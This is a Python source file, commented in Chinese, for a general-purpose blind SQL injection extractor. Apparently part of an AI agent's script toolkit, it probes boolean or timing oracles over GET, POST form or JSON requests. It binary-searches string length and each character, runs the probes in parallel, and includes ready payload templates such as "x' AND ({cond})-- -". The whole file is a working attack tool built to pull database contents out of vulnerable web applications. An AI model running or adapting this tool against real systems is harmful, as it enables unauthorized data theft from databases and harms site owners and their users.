#!/usr/bin/env python3
"""summary: 盲注提取通用工具（布尔/时间 oracle）

description:
  对布尔盲注（含时间盲）场景的通用提取器：长度探测 + 逐位 ascii 二分 + 并行提取 + 重试。
  支持 GET / POST(form) / POST(JSON) 三种请求形态与自定义 header/cookie；oracle 支持
  match 模式（响应特征串）与 timing 模式（响应耗时阈值）。库 import 或 CLI 直接运行。

  依赖: requests

  适用范围: 条件原语为 length()/substr()/ascii()（PostgreSQL / MySQL / Oracle 可用；
  SQL Server（LEN/SUBSTRING/UNICODE）与 SQLite（unicode）等暂不支持）。提取范围为 ASCII
  （码点 ≤255）——非 ASCII 数据（>255 码点）会被饱和为 255，需扩展二分上界。

usage:
  库:
    import sys; sys.path.insert(0, "$AGENT_DIR/scripts")
    from blind_extract import BlindOracle, OracleConfig
    o = BlindOracle(OracleConfig(url_template="http://t/p?q={payload}",
                                 payload_template="x' AND ({cond})-- -",
                                 true_match="ok", false_match="no"))
    o.check("1=1")                  # 单次判定
    o.extract("(SELECT version())") # 逐字符提取
  CLI:
    $PYTHON_CMD $AGENT_DIR/scripts/blind_extract.py \\
      --url "http://t/p?q={payload}" --payload-template "x' AND ({cond})-- -" \\
      --true "ok" --false "no" --expr "current_database()"
  回归测试: test_blind_extract.py

  排错: 提取为空/全哨兵字符时先查 ① 可见性（跨角色/权限遮蔽）② 自匹配（检查请求自身文本
  含筛选字面量）③ 行漂移（子查询逐轮重算 → 固定行/pid）；可用 --verify-cond 预检。

level: intermediate
"""

from __future__ import annotations

import argparse
import json
import sys
import threading
import time
import urllib.parse
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

import requests

__all__ = ["OracleConfig", "BlindOracle", "OracleError"]


@dataclass
class OracleConfig:
    """oracle 配置：url_template 含 {payload}；payload_template 含 {cond}。"""
    url_template: str
    payload_template: str
    true_match: str = ""
    false_match: str = ""
    mode: str = "match"          # match | timing
    timing_threshold_s: float = 3.0
    method: str = "GET"          # GET | POST
    data_template: str = ""      # POST form 体模板（含 {payload}）
    json_template: str = ""      # POST JSON 体模板（含 {payload}）
    headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)
    timeout_s: float = 20.0
    retries: int = 4
    delay_s: float = 0.0


class OracleError(RuntimeError):
    """oracle 连续失败（特征未命中/网络错误）。"""


def _validate_config(cfg: OracleConfig) -> None:
    """启动即校验模板占位符与模式配置，防"恒真/恒假"静默垃圾结果。"""
    if cfg.mode not in ("match", "timing"):
        raise ValueError(f"mode 必须为 match|timing: {cfg.mode!r}")
    if cfg.method.upper() not in ("GET", "POST"):
        raise ValueError(f"method 必须为 GET|POST: {cfg.method!r}")
    if "{cond}" not in cfg.payload_template:
        raise ValueError("payload_template 必须含 {cond} 占位符")
    if "{payload}" not in (cfg.url_template + cfg.data_template + cfg.json_template):
        raise ValueError("url/data/json 模板至少一处须含 {payload} 占位符")
    if cfg.mode == "match" and not (cfg.true_match or cfg.false_match):
        raise ValueError("match 模式必须提供 true_match 或 false_match 特征串")


class BlindOracle:
    """布尔/时间盲注 oracle：check() 单次判定；length()/char_at()/extract() 盲提取。"""

    def __init__(self, cfg: OracleConfig, workers: int = 8) -> None:
        _validate_config(cfg)
        self.cfg = cfg
        self.workers = workers
        self.requests_made = 0
        self._lock = threading.Lock()
        self._tls = threading.local()

    # ── HTTP ──
    def _session(self) -> requests.Session:
        sess: Optional[requests.Session] = getattr(self._tls, "session", None)
        if sess is None:
            sess = requests.Session()
            sess.headers.update(self.cfg.headers)
            for k, v in self.cfg.cookies.items():
                sess.cookies.set(k, v)
            self._tls.session = sess
        return sess

    def _send(self, payload: str) -> requests.Response:
        cfg = self.cfg
        url = cfg.url_template.replace("{payload}", urllib.parse.quote(payload, safe=""))
        extra_headers: dict[str, str] = {}
        kwargs: dict[str, object] = {"timeout": cfg.timeout_s}
        if cfg.json_template:
            body = cfg.json_template.replace("{payload}", json.dumps(payload)[1:-1])
            kwargs["data"] = body.encode("utf-8")
            extra_headers["Content-Type"] = "application/json"
        elif cfg.data_template:
            body = cfg.data_template.replace("{payload}", urllib.parse.quote(payload, safe=""))
            kwargs["data"] = body.encode("utf-8")
            extra_headers["Content-Type"] = "application/x-www-form-urlencoded"
        return self._session().request(cfg.method.upper(), url, headers=extra_headers, **kwargs)

    # ── oracle ──
    def check(self, cond: str) -> bool:
        """对条件做一次布尔判定；连续 retries 次异常则抛 OracleError。"""
        cfg = self.cfg
        payload = cfg.payload_template.replace("{cond}", cond)
        last_err = "未知"
        for attempt in range(cfg.retries):
            try:
                t0 = time.monotonic()
                r = self._send(payload)
                elapsed = time.monotonic() - t0
                with self._lock:
                    self.requests_made += 1
                if cfg.mode == "timing":
                    return elapsed >= cfg.timing_threshold_s
                if cfg.true_match and cfg.true_match in r.text:
                    return True
                if cfg.false_match:
                    if cfg.false_match in r.text:
                        return False
                    last_err = f"响应未含 True/False 特征 (status={r.status_code})"
                else:
                    return False
            except requests.RequestException as e:
                last_err = repr(e)
            if cfg.delay_s:
                time.sleep(cfg.delay_s)
            time.sleep(0.2 * (attempt + 1))
        raise OracleError(f"oracle 连续 {cfg.retries} 次失败: {last_err}")

    def length(self, expr: str, max_len: int = 200) -> int:
        """二分探测 length(expr)；返回最大 n（≤max_len）使 length(expr)>=n，无匹配返回 0。"""
        if not self.check(f"length({expr})>=1"):
            return 0
        lo, hi = 1, max_len
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.check(f"length({expr})>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def char_at(self, expr: str, pos: int) -> int:
        """二分探测 ascii(substr(expr,pos,1))；越界/NULL 返回 0（上界 255=ASCII，见模块 docstring）。"""
        lo, hi = 0, 255
        while lo < hi:
            mid = (lo + hi) // 2
            if self.check(f"ascii(substr({expr},{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extract(self, expr: str, max_len: int = 200, stop_chars: str = "",
                workers: Optional[int] = None) -> str:
        """并行逐字符提取；stop_chars 命中即终止且该字符包含在结果内。"""
        n = self.length(expr, max_len=max_len)
        if n == 0:
            return ""
        nw = max(1, workers or self.workers)

        def work(i: int) -> tuple[int, str]:
            code = self.char_at(expr, i + 1)
            return i, (chr(code) if code else "")

        chars: dict[int, str] = {}
        stop_idx: Optional[int] = None
        with ThreadPoolExecutor(max_workers=nw) as ex:
            futs: dict[Future, int] = {ex.submit(work, i): i for i in range(n)}
            for fut in as_completed(futs):
                i, ch = fut.result()
                chars[i] = ch
                if ch == "" or (stop_chars and ch in stop_chars):
                    if stop_idx is None or i < stop_idx:
                        stop_idx = i
                if stop_idx is not None and all(k in chars for k in range(stop_idx + 1)):
                    for f, j in futs.items():
                        if j > stop_idx:
                            f.cancel()
                    break
        end = stop_idx + 1 if stop_idx is not None else n
        return "".join(chars.get(i, "") for i in range(end))


# ── CLI ──
def _kv(items: list[str], sep: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for it in items:
        if sep not in it:
            raise SystemExit(f"参数格式错误（缺少 '{sep}'）: {it}")
        k, v = it.split(sep, 1)
        out[k.strip()] = v.strip()
    return out


def _parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="盲注提取通用工具（布尔/时间 oracle）",
        epilog="示例: %(prog)s --url 'http://t/p?q={payload}' --payload-template \"x' AND ({cond})-- -\" "
               "--true ok --false no --expr current_database()")
    p.add_argument("--url", required=True, help="请求 URL 模板（含 {payload}）")
    p.add_argument("--payload-template", required=True, help="payload 模板（含 {cond}）")
    p.add_argument("--true", dest="true_match", default="", help="match 模式：响应含此串判 True")
    p.add_argument("--false", dest="false_match", default="",
                   help="match 模式：响应含此串判 False（省略时非 True 即 False）")
    p.add_argument("--mode", choices=["match", "timing"], default="match")
    p.add_argument("--timing-threshold", type=float, default=3.0, help="timing 模式：耗时≥该值判 True（秒）")
    p.add_argument("--method", choices=["GET", "POST"], default="GET")
    p.add_argument("--data", dest="data_template", default="", help="POST form 体模板（含 {payload}）")
    p.add_argument("--json", dest="json_template", default="", help="POST JSON 体模板（含 {payload}）")
    p.add_argument("--header", action="append", default=[], metavar="K:V", help="请求头（可重复）")
    p.add_argument("--cookie", action="append", default=[], metavar="K=V", help="Cookie（可重复）")
    p.add_argument("--expr", required=True, help="SQL 表达式（子查询用括号包裹；可空结果建议 coalesce(expr,'')）")
    p.add_argument("--stop", default="", help="命中该字符即停止且包含在结果内（如 '}'）")
    p.add_argument("--max-len", type=int, default=200)
    p.add_argument("--workers", type=int, default=8)
    p.add_argument("--verify-cond", default="", help="预检条件（期望为真；不满足则退出码 2）")
    p.add_argument("--output", default="", help="结果 JSON 落盘路径（expr/result/requests/elapsed_s）")
    p.add_argument("--timeout", type=float, default=20.0)
    p.add_argument("--retries", type=int, default=4)
    p.add_argument("--delay", type=float, default=0.0)
    return p


def main(argv: Optional[list[str]] = None) -> int:
    args = _parser().parse_args(argv)
    cfg = OracleConfig(
        url_template=args.url, payload_template=args.payload_template,
        true_match=args.true_match, false_match=args.false_match,
        mode=args.mode, timing_threshold_s=args.timing_threshold,
        method=args.method, data_template=args.data_template, json_template=args.json_template,
        headers=_kv(args.header, ":"), cookies=_kv(args.cookie, "="),
        timeout_s=args.timeout, retries=args.retries, delay_s=args.delay)
    try:
        oracle = BlindOracle(cfg, workers=args.workers)
    except ValueError as e:
        print(f"[!] 配置错误: {e}", file=sys.stderr)
        return 2
    t0 = time.monotonic()
    try:
        if args.verify_cond:
            ok = oracle.check(args.verify_cond)
            print(f"[verify] {args.verify_cond} -> {ok}")
            if not ok:
                print("[!] verify-cond 未通过：检查可见性/自匹配/请求配置（见脚本 docstring 排错节）",
                      file=sys.stderr)
                return 2
        result = oracle.extract(args.expr, max_len=args.max_len, stop_chars=args.stop, workers=args.workers)
        if not result or all(c in "\x00\xff" for c in result):
            result = oracle.extract(args.expr, max_len=args.max_len, stop_chars=args.stop, workers=args.workers)
        if not result:
            print("[!] 提取为空：检查 expr/可见性/自匹配（建议 --verify-cond 预检）", file=sys.stderr)
        elif all(c in "\x00\xff" for c in result):
            print("[!] 结果全为哨兵字符（\\xff）：oracle 配置可能有误或行不可见", file=sys.stderr)
        if len(result) >= args.max_len:
            print(f"[!] 长度达到上限 {args.max_len}，可能被截断（增大 --max-len）", file=sys.stderr)
    except OracleError as e:
        print(f"[!] {e}", file=sys.stderr)
        return 3
    dt = time.monotonic() - t0
    print(f"[result] {result!r} ({len(result)} chars, {oracle.requests_made} requests, {dt:.1f}s)")
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump({"expr": args.expr, "result": result,
                       "requests": oracle.requests_made, "elapsed_s": round(dt, 2)},
                      f, ensure_ascii=False, indent=2)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
